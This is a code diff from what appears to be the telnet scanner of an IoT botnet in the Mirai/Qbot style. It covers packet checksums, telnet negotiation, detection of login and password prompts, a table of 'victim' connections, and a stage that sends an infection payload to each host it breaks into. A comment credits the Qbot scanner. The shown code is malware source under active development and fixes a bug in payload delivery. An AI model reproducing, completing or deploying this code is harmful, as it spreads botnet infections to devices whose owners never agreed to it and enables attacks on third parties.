@@ -41,82 +41,98 @@ void scan_init(void)
 // Not mine!
 uint16_t checksum_generic(uint16_t *addr, uint32_t count)
 {
-    register unsigned long sum = 0;
+	register unsigned long sum = 0;
 
-    for (sum = 0; count > 1; count -= 2)
-        sum += *addr++;
-    if (count == 1)
-        sum += (char)*addr;
+	for (sum = 0; count > 1; count -= 2)
+		sum += *addr++;
+	if (count == 1)
+		sum += (char)*addr;
 
-    sum = (sum >> 16) + (sum & 0xFFFF);
-    sum += (sum >> 16);
-    
-    return ~sum;
+	sum = (sum >> 16) + (sum & 0xFFFF);
+	sum += (sum >> 16);
+	
+	return ~sum;
 }
 uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
 {
-    const uint16_t *buf = buff;
-    uint32_t ip_src = iph->saddr;
-    uint32_t ip_dst = iph->daddr;
-    uint32_t sum = 0;
-    
-    while (len > 1)
-    {
-        sum += *buf;
-        buf++;
-        len -= 2;
-    }
+	const uint16_t *buf = buff;
+	uint32_t ip_src = iph->saddr;
+	uint32_t ip_dst = iph->daddr;
+	uint32_t sum = 0;
+	
+	while (len > 1)
+	{
+		sum += *buf;
+		buf++;
+		len -= 2;
+	}
 
-    if (len == 1)
-        sum += *((uint8_t *) buf);
+	if (len == 1)
+		sum += *((uint8_t *) buf);
 
-    sum += (ip_src >> 16) & 0xFFFF;
-    sum += ip_src & 0xFFFF;
-    sum += (ip_dst >> 16) & 0xFFFF;
-    sum += ip_dst & 0xFFFF;
-    sum += htons(iph->protocol);
-    sum += data_len;
+	sum += (ip_src >> 16) & 0xFFFF;
+	sum += ip_src & 0xFFFF;
+	sum += (ip_dst >> 16) & 0xFFFF;
+	sum += ip_dst & 0xFFFF;
+	sum += htons(iph->protocol);
+	sum += data_len;
 
-    while (sum >> 16) 
-        sum = (sum & 0xFFFF) + (sum >> 16);
+	while (sum >> 16) 
+		sum = (sum & 0xFFFF) + (sum >> 16);
 
-    return ((uint16_t) (~sum));
+	return ((uint16_t) (~sum));
 }
 
-#define TELNET_DO 0xFD
-#define TELNET_WONT 0xFC
-#define TELNET_WILL 0xFB
-#define TELNET_DONT 0xFE
-#define TELNET_CMD 0xFF
-#define TELNET_CMD_ECHO 1
+#define TELNET_DO 0xFD // 253
+#define TELNET_WONT 0xFC // 252
+#define TELNET_WILL 0xFB // 251
+#define TELNET_DONT 0xFE // 254
+#define TELNET_CMD 0xFF // 255
  
-static inline __attribute__((always_inline)) bool scan_negotiate(int32_t sock, unsigned char *buf, int16_t len)
+static inline __attribute__((always_inline)) void scan_negotiate(int32_t sock)
 {
-	printd("Negotiating sock %d with str %x %x", sock, buf[0], buf[1]);
-	if (buf[0] == TELNET_DO)
+	unsigned char ptr[3];
+
+	while(1)
 	{
-		unsigned char tmp1[3] = {255, 251, 31};
-		unsigned char tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};
+		recv(sock, ptr, 3, MSG_NOSIGNAL);
+		if (*ptr != 0xff)
+			break;
+		else if (*ptr == 0xff)
+		{	
+			if (ptr[1] == 0xff)
+			{
+				continue;
+			}
+			else if (ptr[1] == 0xfd)
+			{
+				uint8_t tmp1[3] = {255, 251, 31};
+				uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};
 
-		if (send(sock, tmp1, 3, 0) < 0)
-			return false;
-		if (send(sock, tmp2, 9, 0) < 0)
-			return false;
+				if (ptr[2] != 31)
+					goto iac_wont;
 
-		return true;
+				send(sock, tmp1, 3, MSG_NOSIGNAL);
+				send(sock, tmp2, 9, MSG_NOSIGNAL);
+			}
+			else
+			{
+				iac_wont:
+
+				for (uint8_t i = 0; i < 3; i++)
+				{
+					if (ptr[i] == 0xfd)
+						ptr[i] = 0xfc;
+					else if (ptr[i] == 0xfb)
+						ptr[i] = 0xfd;
+				}
+
+				send(sock, ptr, 3, MSG_NOSIGNAL);
+			}
+		}
 	}
 
-	for (uint8_t i = 0; i < len; i++)
-	{
-		if (buf[i] == TELNET_DO)
-			buf[i] = TELNET_WONT;
-		else if (buf[i] == TELNET_WILL)
-			buf[i] = TELNET_DO;
-	}
-	if (send(sock, buf, len, 0) < 0)
-		return false;
-
-	return true;
+	return;
 }
 
 static inline __attribute__((always_inline)) void xselect(int32_t fd)
@@ -135,7 +151,7 @@ static inline __attribute__((always_inline)) bool structcmp(unsigned char *buf, 
 {
 	while (*str != NULL)
 	{
-		printf("Comparing \"%s\" -> \"%s\"\n", buf, *str);
+		// printf("Comparing \"%s\" -> \"%s\"\n", buf, *str);
 		if (subcasestr((const char *)buf, *str++) != -1)
 			return true;
 	}
@@ -184,6 +200,7 @@ uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2
 	I guess the strcmp() like func wasn't working so anyway I mreally messed up
 	*/
 
+	uint8_t found = 0;
 	int16_t i = 0;
 	unsigned char *buf = malloc(sizeof(unsigned char *));
 
@@ -195,32 +212,31 @@ uint8_t scan_readuntil(const int32_t sock, const char **strs, const char **strs2
 		xselect(sock);
 		if (recv(sock, buf, 1, MSG_NOSIGNAL) < 0) // Read 1 from socket
 		{
-			printd("Error %d: %s", errno, strerror(errno));
-			return 0;
-		}
-		#pragma message("Instead of checking for 0xFF every read why not make that a stage in the switch() on the scanner")
-		if (*buf == TELNET_CMD)
-		{
-			uint8_t longbuf[2];
-			if (recv(sock, longbuf, 2, MSG_NOSIGNAL) <= 0)
-			{
+			if (found == 0)
 				printd("Error %d: %s", errno, strerror(errno));
-				return 0;
-			}
-			if (scan_negotiate(sock, longbuf, 2) == false)
+			else
+				printd("Failed to read but we've already found %d", found);
+			break;
+			
+		}
+		#pragma message("Essentially when I comply with telnet it sends the password and user prompt at the same time")
+
+		if (found == 0)
+		{
+			mbuf[i++] = *buf;
+			if (structcmp(mbuf, strs) == true)
 			{
-				printd("Failed to negotiate");
+				printf("Found 1\n");
+				found = 1;
+			}
+			if (structcmp(mbuf, strs2) == true)
+			{
+				printf("Found 2\n");
+				found = 2;
 			}
 		}
-		else
-			mbuf[i++] = *buf;
-
-		if (structcmp(mbuf, strs) == true)
-			return 1;
-		if (structcmp(mbuf, strs2) == true)
-			return 2;
 	}
-	return 0;
+	return found;
 }
 
 bool scan_setnonblock(int32_t fd)
@@ -236,13 +252,13 @@ bool scan_setnonblock(int32_t fd)
 bool scan_scanner(void)
 {
 	int32_t max = getdtablesize();
-	printd("Maximum files open: %d", max)
+	printd("Maximum files open: %d", max);
 #	ifndef SCANNER_TEST
 	if (scan_able == false || scan_scanning == true)
 		_exit(0);
 #	endif
 	scan_scanning = true;
-	printd("Initializing Scanner")
+	printd("Initializing Scanner");
 
 	victim_table = calloc(SCAN_SCANNER_MAXCON, sizeof(struct scan_victim));
 	for (uint8_t i = 0; i <= SCAN_SCANNER_MAXCON; i++)
@@ -504,6 +520,7 @@ bool scan_scanner(void)
 						else
 						{
 							printd("%d->%s Select success", i, ipv4_unpack(victim_table[i].ip));
+							scan_negotiate(victim_table[i].sock);
 							// From Qbot scanner
 							// I think it checks for erros and if thers one valopt becomes 1
 							socklen_t tmp = sizeof(int);
@@ -603,9 +620,17 @@ _USERNAME_END:
 					case PAYLOAD:
 					{
 						// I know this look stupid for now but I'll clean it up later
+						/* Why does the payload never send??*/
 						printd("%d->%s Sending payload", i, ipv4_unpack(victim_table[i].ip));
-						if (send(victim_table[i].sock, SCAN_SCANNER_PAYLOAD, strlen(SCAN_SCANNER_PAYLOAD), 0) == -1)
+						if (send(victim_table[i].sock, SCAN_SCANNER_PAYLOAD, SCAN_SCANNER_PAYLOAD_LEN, 0) == -1)
+						{
+							printd("Failed to send payload");
 							victim_table[i].state = FINISHED;
+						}
+						else
+						{
+							printd("Payload sent: %s", SCAN_SCANNER_PAYLOAD);
+						}
 						victim_table[i].state = FINISHED;
 						break;
 					}
